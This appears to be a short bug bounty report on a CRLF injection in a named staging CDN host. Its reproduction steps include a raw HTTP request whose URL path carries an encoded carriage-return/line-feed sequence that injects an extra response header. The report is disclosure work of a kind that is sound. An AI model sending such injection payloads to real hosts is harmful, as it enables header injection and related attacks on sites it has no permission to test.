## Summary (team, by jair)

### Summary
CRLF Injection - `http://stage-static-cdn.mackeeper.com/`

### Steps To Reproduce
In the rawRequest we have added `'%0D%0Avirus:%20value'`
In Burp Repeater copy and paste the below rawRequest
Notice the response with header added

```
------rawRequest----------
GET /%0D%0Avirus:%20value HTTP/1.1
Connection: keep-alive
Accept: /
Accept-Encoding: gzip,deflate
Host: stage-static-cdn.mackeeper.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0

------rawRequest----------
```
